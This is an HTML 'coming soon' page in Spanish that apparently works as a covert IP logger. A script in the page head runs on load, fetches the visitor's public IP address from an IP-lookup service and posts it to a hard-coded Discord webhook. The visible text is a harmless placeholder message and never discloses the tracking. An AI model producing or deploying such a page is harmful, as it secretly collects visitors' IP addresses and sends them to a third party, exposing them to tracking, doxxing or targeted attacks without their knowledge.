<!DOCTYPE html>
<html>
<head>
    <title>Próximamente...</title>
    <style>
        body {
            background-color: #f0f0f0;
            font-family: Arial, sans-serif;
            text-align: center;
            padding-top: 100px;
        }

        h1 {
            font-size: 36px;
            color: #333;
        }

        p {
            font-size: 18px;
            color: #666;
        }
    </style>
    <script>
        function enviarIP(ip) {
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "https://discord.com/api/webhooks/1233812209348644864/mvH8Bl-zkViiAPqLk701FdgqRbp0aiHF3ky444oD2WzGZ7AoXo_KD0O8C7qNP7E14Nmz", true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            var mensaje = "La dirección IP del visitante es: " + ip;
            var data = JSON.stringify({"content": mensaje});
            xhr.send(data);
        }

        function obtenerIP() {
            fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                var ip = data.ip;
                enviarIP(ip);
            });
        }
    </script>
</head>
<body onload="obtenerIP()">
    <h1>Próximamente...</h1>
    <p>¡Estamos trabajando en algo increíble! Vuelve pronto para ver las novedades.</p>
</body>
</html>
